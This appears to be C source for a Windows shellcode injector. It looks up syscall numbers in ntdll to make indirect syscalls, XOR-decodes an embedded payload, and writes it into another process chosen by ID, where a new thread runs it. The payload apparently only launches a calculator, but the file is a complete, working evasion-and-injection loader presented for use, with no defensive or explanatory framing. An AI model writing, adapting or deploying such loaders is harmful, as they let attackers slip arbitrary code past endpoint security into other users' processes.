#include "header.h"
#define KEY 0x12

unsigned char code[276];


DWORD NtOpenProcessSSN;
DWORD NtAllocateVirtualMemorySSN;
DWORD NtWriteVirtualMemorySSN;
DWORD NtCreateThreadExSSN;
DWORD NtWaitForSingleObjectSSN;
DWORD NtCloseSSN;
									/*THESE HOLD OUR SSN AND SYSCALL NUMBERS WHICH THE .ASM FILE WILL USE TO CREATE THE INDIRECT SYSCALLS*/
UINT_PTR NtOpenProcessSyscall;
UINT_PTR NtAllocateVirtualMemorySyscall;
UINT_PTR NtWriteVirtualMemorySyscall;
UINT_PTR NtCreateThreadExSyscall;
UINT_PTR NtWaitForSingleObjectSyscall;
UINT_PTR NtCloseSyscall;


unsigned char code[] =
"\xee\x5a\x91\xf6\xe2\xfa\xd2\x12\x12\x12\x53\x43\x53\x42"
"\x40\x43\x44\x5a\x23\xc0\x77\x5a\x99\x40\x72\x5a\x99\x40"
"\x0a\x5a\x99\x40\x32\x5a\x99\x60\x42\x5a\x1d\xa5\x58\x58"
"\x5f\x23\xdb\x5a\x23\xd2\xbe\x2e\x73\x6e\x10\x3e\x32\x53"
"\xd3\xdb\x1f\x53\x13\xd3\xf0\xff\x40\x53\x43\x5a\x99\x40"
"\x32\x99\x50\x2e\x5a\x13\xc2\x99\x92\x9a\x12\x12\x12\x5a"
"\x97\xd2\x66\x75\x5a\x13\xc2\x42\x99\x5a\x0a\x56\x99\x52"
"\x32\x5b\x13\xc2\xf1\x44\x5a\xed\xdb\x53\x99\x26\x9a\x5a"
"\x13\xc4\x5f\x23\xdb\x5a\x23\xd2\xbe\x53\xd3\xdb\x1f\x53"
"\x13\xd3\x2a\xf2\x67\xe3\x5e\x11\x5e\x36\x1a\x57\x2b\xc3"
"\x67\xca\x4a\x56\x99\x52\x36\x5b\x13\xc2\x74\x53\x99\x1e"
"\x5a\x56\x99\x52\x0e\x5b\x13\xc2\x53\x99\x16\x9a\x5a\x13"
"\xc2\x53\x4a\x53\x4a\x4c\x4b\x48\x53\x4a\x53\x4b\x53\x48"
"\x5a\x91\xfe\x32\x53\x40\xed\xf2\x4a\x53\x4b\x48\x5a\x99"
"\x00\xfb\x45\xed\xed\xed\x4f\x5a\xa8\x13\x12\x12\x12\x12"
"\x12\x12\x12\x5a\x9f\x9f\x13\x13\x12\x12\x53\xa8\x23\x99"
"\x7d\x95\xed\xc7\xa9\xf2\x0f\x38\x18\x53\xa8\xb4\x87\xaf"
"\x8f\xed\xc7\x5a\x91\xd6\x3a\x2e\x14\x6e\x18\x92\xe9\xf2"
"\x67\x17\xa9\x55\x01\x60\x7d\x78\x12\x4b\x53\x9b\xc8\xed"
"\xc7\x71\x73\x7e\x71\x3c\x77\x6a\x77\x12\x12";


HMODULE GetMod(
	IN LPCWSTR modName
) {

	HMODULE hModule = NULL; // Handle To Module After We Use GetModuleHandleW

	inf("trying to get a handle to %S", modName);
	hModule = GetModuleHandleW(modName);

	if (hModule == NULL) {
		error("failed to get a handle to the module, error: 0x%lx\n", GetLastError());
		return NULL;
	}

	else {
		good("got a handle to the module!");
		inf("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
		return hModule;
	}

}

VOID inDirect(IN HMODULE hNTDLL, IN LPCSTR FuncName, OUT DWORD* SSN, OUT UINT_PTR* SYSCALL) {
	UINT_PTR NtFunctionAddr = NULL;
	BYTE SysOpcodes[2] = { 0x0F, 0x05 }; // These Are The OpCodes For SYSCALL, We Use Them To Compare Against, so we Know We found the Syscall

	inf("Beginning Indirect...");
	inf("Getting Address Of %s\n", FuncName);
	NtFunctionAddr = (UINT_PTR)GetProcAddress(hNTDLL, FuncName); // Get Address Of Our Function (NtOpenProcess For Example)

	if (NtFunctionAddr == NULL) {
		error("Failed Finding Address\tCode: 0x%ld", GetLastError());
		return NULL;
	}
	good("Got Function Addresss\n\\____0x%p", NtFunctionAddr);

	inf("Getting SSN...");
	*SSN = ((PBYTE)(NtFunctionAddr + 4))[0]; // SSN Number is 9/10 Stored 4 bytes From Start
	*SYSCALL = NtFunctionAddr + 0x12;       //  Syscall number Is Stored 12 bytes From Start Of Function

	if (memcmp(SysOpcodes, *SYSCALL, sizeof(SysOpcodes)) == 0) { // Compare the Found SysOpcodes To The correct ones
		good("Syscall Opcodes Match!");
	}
	else {
		error("OpCodes Did Not Match 0x0F, 0x05");
		return NULL;
	}

	good("Got SSN Of %s [0x%1x]", FuncName, *SSN); // Print SSN Number
}

BOOL statusCheck(IN NTSTATUS status) {
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}

int main(int argc, char* argv[]) {
	HANDLE   hProc   = NULL;     // Holds Handle To Process
	HANDLE   hThread = NULL;    //  Holds Handle to thread
	NTSTATUS status  = NULL;   //   Will hold The STATUS Output From NTAPI Function
	PVOID    rBuffer = NULL;  //    Holds pointer to the Buffer We Allocate
	HMODULE  hNTDLL  = NULL; //     Holds Handle To loaded NTDLL file

	DWORD pID = atoi(argv[1]);    // Holds Notepad Process ID
	DWORD tID = 0;               //  Holds Thread Id Number
	DWORD bytes_ret = NULL;     //   Will hold the Amount Of Bytes WriteProcessMemory Writes
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };       // Some Functions Require a populated Structure as an argument
	CLIENT_ID CID        = { (HANDLE)pID, NULL };

	size_t code_len = sizeof(code);  // Size of the payload

	hNTDLL = GetMod(L"NTDLL"); // Get Hanlde to ntdll.dll
	if (hNTDLL == NULL) {
		error("Failed Getting Module Address\tCode: 0x%ld", GetLastError());
		return EXIT_FAILURE;
	}
	inDirect(hNTDLL, "NtOpenProcess", &NtOpenProcessSSN, &NtOpenProcessSyscall);
	inDirect(hNTDLL, "NtAllocateVirtualMemory", &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
	/*
		Get the SSN Number and SYSCALL address Of The Needed Functions
	*/
	inDirect(hNTDLL, "NtWriteVirtualMemory", &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
	inDirect(hNTDLL, "NtCreateThreadEx", &NtCreateThreadExSSN, &NtCreateThreadExSyscall);
	inDirect(hNTDLL, "NtWaitForSingleObject", &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);
	inDirect(hNTDLL, "NtClose", &NtCloseSSN, &NtCloseSyscall);
	printf("===============================================\n");

	for (int i = 0; i < code_len; i++) {
		code[i] = code[i] ^ KEY;
	}

	inf("Found All SSNs, Sycalls, Injection Starting...");

	// Now We Just Do The Normal NTAPI Injection process
	status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &OA, &CID); // Get Handle To Notepad
	if (status != STATUS_SUCCESS) {
		error("Open Failed");
		return EXIT_FAILURE;
	}
	good("Got Handle To [%ld]\n\\____0x%p\n", pID, hProc);

	status = NtAllocateVirtualMemory(hProc, &rBuffer, 0, &code_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); // Allocate a Buffer For Our payload
	if (!statusCheck(status)) {
		error("Allocate Fail");
		return EXIT_FAILURE;
	}
	good("Allocated a Buffer [%d-Bytes]\n\\____0x%p\n", code_len, rBuffer);

	status = NtWriteVirtualMemory(hProc, rBuffer, code, code_len, &bytes_ret); // Write PayLoad into memory
	if (!statusCheck(status)) {
		error("Write Fail");
		return EXIT_FAILURE;
	}
	good("Wrote %ld Bytes To Memory\n", bytes_ret);

	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProc, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL); // Create Thread to Run it
	if (!statusCheck(status)) {
		error("Thread Fail");
		return EXIT_FAILURE;
	}
	inf("Thread Created\n\\____0x%p\n", hThread);

	NtWaitForSingleObject(hThread, FALSE, NULL); // Wait For Thread To finish
	good("Thread Finished cleaning up");

	NtClose(hThread); // Close Handle And Thread
	NtClose(hProc);
	return EXIT_SUCCESS;
}